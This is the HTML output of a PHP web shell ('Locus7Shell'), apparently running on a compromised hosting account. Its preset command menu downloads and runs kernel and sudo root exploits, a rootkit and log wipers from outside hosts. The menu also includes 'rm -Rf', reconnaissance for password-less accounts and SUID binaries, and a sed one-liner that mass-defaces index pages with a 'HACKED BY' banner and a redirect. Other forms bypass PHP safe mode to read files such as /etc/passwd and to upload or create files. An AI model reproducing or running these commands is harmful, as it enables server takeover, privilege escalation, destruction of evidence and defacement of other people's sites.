    <div align="center">Useful Commands  
    </div> 
    <form action="?"> 
      <div align="center"> 
        <input type=hidden name=act value="cmd"> 
        <input type=hidden name="d" value="/home/storieso/public_html/"> 
          <SELECT NAME="cmd"> 
            <OPTION VALUE="uname -a">Kernel version 
              <OPTION VALUE="w">Logged in users 
                <OPTION VALUE="lastlog">Last to connect 
                  <OPTION VALUE="find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2> /dev/null">Suid bins 
                    <OPTION VALUE="cut -d: -f1,2,3 /etc/passwd | grep ::">USER WITHOUT PASSWORD! 
                    <OPTION VALUE="find /etc/ -type f -perm -o+w 2> /dev/null">Write in /etc/? 
                    <OPTION VALUE="which wget curl w3m lynx">Downloaders? 
                    <OPTION VALUE="cat /proc/version /proc/cpuinfo">CPUINFO 
                    <OPTION VALUE="netstat -atup | grep IST">Open ports 
                    <OPTION VALUE="locate gcc">gcc installed? 
                    <OPTION VALUE="rm -Rf">Format box (DANGEROUS) 
                    <OPTION VALUE="wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c">WIPELOGS PT1 (If wget installed) 
                    <OPTION VALUE="gcc zap2.c -o zap2">WIPELOGS PT2 
                    <OPTION VALUE="./zap2">WIPELOGS PT3 
                    <OPTION VALUE="wget http://ftp.powernet.com.tr/supermail/debug/k3">Kernel attack (Krad.c) PT1 (If wget installed) 
                    <OPTION VALUE="./k3 1">Kernel attack (Krad.c) PT2 (L1) 
                    <OPTION VALUE="./k3 2">Kernel attack (Krad.c) PT2 (L2) 
                    <OPTION VALUE="./k3 3">Kernel attack (Krad.c) PT2 (L3) 
                    <OPTION VALUE="./k3 4">Kernel attack (Krad.c) PT2 (L4) 
                    <OPTION VALUE="./k3 5">Kernel attack (Krad.c) PT2 (L5) 
                    <OPTION VALUE="wget http://precision-gaming.com/sudo.c">wget Linux sudo stack overflow
                    <OPTION VALUE="gcc sudo.c -o sudosploit">Compile Linux sudo sploit
                    <OPTION VALUE="./sudosploit">Execute Sudosploit
                    <OPTION VALUE="wget http://twofaced.org/linux2-6-all.c">Linux Kernel 2.6.* rootkit.c
                    <OPTION VALUE="gcc linux2-6-all.c -o linuxkernel">Compile Linux2-6-all.c
                    <OPTION VALUE="./linuxkernel">Run Linux2-6-all.c
                    <OPTION VALUE="wget http://twofaced.org/mig-logcleaner.c">Mig LogCleaner
                    <OPTION VALUE="gcc -DLINUX -WALL mig-logcleaner.c -o migl">Compile Mig LogCleaner
                    <OPTION VALUE="./migl -u root 0">Compile Mig LogCleaner
                    <OPTION VALUE="sed -i -e 's/<html>/<div style=\'position\:absolute\;width\:2000px\;height\:2000px\;background-color\:black\'><br><br><br><br>&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;<img src=\'http://img244.imageshack.us/img244/6663/locus7sgm8.jpg\'><br><font size=\'10\' color=\'green\'>&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;<font size=\'10\' color=\'green\'>HACKED BY <a href=\'http\:\/\/locus7s.com\'>LOCUS7S<\/a><\/font><\/div><meta http-equiv=\'refresh\' content=\'5\\;url=http\:\/\/locus7s.com\'>/g' index.*">index.* Mass Defacement
                  </SELECT> 
        <input type=hidden name="cmd_txt" value="1"> 
        &nbsp; 
        <input type=submit name=submit value="Execute"> 
          <br> 
        Warning. Kernel may be alerted using higher levels </div> 
    </form> 
    </td> 
  <td width="50%" height="83" valign="top"><center> 
   <center>Kernel Info: <form name="form1" method="post" action="http://google.com/search"> 
      <input name="q" type="text" id="q" size="80" value="FreeBSD df20.dot5hosting.com 4.11-STABLE FreeBSD 4.11-STABLE #0: Wed Apr
i386"> 
      <input type="hidden" name="client" value="firefox-a"> 
      <input type="hidden" name="rls" value="org.mozilla:en-US:official"> 
      <input type="hidden" name="hl" value="en"> 
      <input type="hidden" name="hs" value="b7p"> 
      <input type=submit name="btnG" VALUE="Search"> 
    </form></center> 
    </td> 

</tr></TABLE><br> 
<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="116" width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1> 
<tr><td height="1" valign="top" colspan="2"></td></tr> 
<tr> 
  <td width="50%" height="83" valign="top"><center> 
    <div align="center">Php Safe-Mode Bypass (Read Files) 
    </div><br> 
    <form action="?"> 
      <div align="center"> 
      File: <input type="text" name="file" method="get"> <input type="submit" value="Read File"><br><br> eg: /etc/passwd<br> 
       
       
       
            
       
       
       
     
     

          <br> 
      </div> 
    </form> 
    </td> 
  <td width="50%" height="83" valign="top"><center> 
   <center>Php Safe-Mode Bypass (List Directories):     <form action="?"> 
      <div align="center"><br> 
      Dir: <input type="text" name="directory" method="get"> <input type="submit" value="List Directory"><br><br> eg: /etc/<br> 

    </form></center> 
    </td> 

</tr></TABLE> 


























<br> 
<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1> 
<tr> 
 <td width="50%" height="1" valign="top"><center>Search<form method="POST"><input type=hidden name=act value="search"><input type=hidden name="d" value="/home/storieso/public_html/"><input type="text" name="search_name" size="29" value="(.*)">&nbsp;<input type="checkbox" name="search_name_regexp" value="1"  checked> - regexp&nbsp;<input type=submit name=submit value="Search"></form></center></p></td> 
 <td width="50%" height="1" valign="top"><center>Upload<form method="POST" ENCTYPE="multipart/form-data"><input type=hidden name=act value="upload"><input type="file" name="uploadfile"><input type=hidden name="miniform" value="1">&nbsp;<input type=submit name=submit value="Upload"><br><font color=red>[ Read-Only ]</font></form></center></td> 
</tr> 
</table> 
<br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1><tr><td width="50%" height="1" valign="top"><center>Make Dir<form action="?"><input type=hidden name=act value="mkdir"><input type=hidden name="d" value="/home/storieso/public_html/"><input type="text" name="mkdir" size="50" value="/home/storieso/public_html/">&nbsp;<input type=submit value="Create"><br><font color=red>[ Read-Only ]</font></form></center></td><td width="50%" height="1" valign="top"><center>Make File<form method="POST"><input type=hidden name=act value="mkfile"><input type=hidden name="d" value="/home/storieso/public_html/"><input type="text" name="mkfile" size="50" value="/home/storieso/public_html/"><input type=hidden name="ft" value="edit">&nbsp;<input type=submit value="Create"><br><font color=red>[ Read-Only ]</font></form></center></td></tr></table> 

<br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1><tr><td width="50%" height="1" valign="top"><center>Go Dir<form action="?"><input type=hidden name=act value="ls"><input type="text" name="d" size="50" value="/home/storieso/public_html/">&nbsp;<input type=submit value="Go"></form></center></td><td width="50%" height="1" valign="top"><center>Go File<form action="?"><input type=hidden name=act value="gofile"><input type=hidden name="d" value="/home/storieso/public_html/"><input type="text" name="f" size="50" value="/home/storieso/public_html/">&nbsp;<input type=submit value="Go"></form></center></td></tr></table> 
<br><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1><tr><td width="990" height="1" valign="top"><p align="center"><b>--[ x2300 Locus7Shell v. 1.0a beta <a href="http://www.locus7s.com/"><u><b>Modded by</b></u></a> #!physx^  | <a href="http://www.locus7s.com">www.LOCUS7S.com</font></a><font color="#FF0000"></font> | Generation time: 0.0245 ]--</b></p></td></tr></table> 
</body>
</noscript>
<div style="text-align: center;"><div style="position:relative; top:0; width: 468px; height: 63px; margin-right:auto;margin-left:auto; z-index:99999">
<!-- BEGIN STANDARD TAG - 468 x 60 - ifastnet.com: Run-of-site - DO NOT MODIFY -->
<IFRAME FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0
SCROLLING=NO WIDTH=468 HEIGHT=60
SRC="http://adserving.cpxinteractive.com/st?ad_type=iframe&ad_size=468x60&section=200773"></IFRAME>
<!-- END TAG -->
</div></div></html>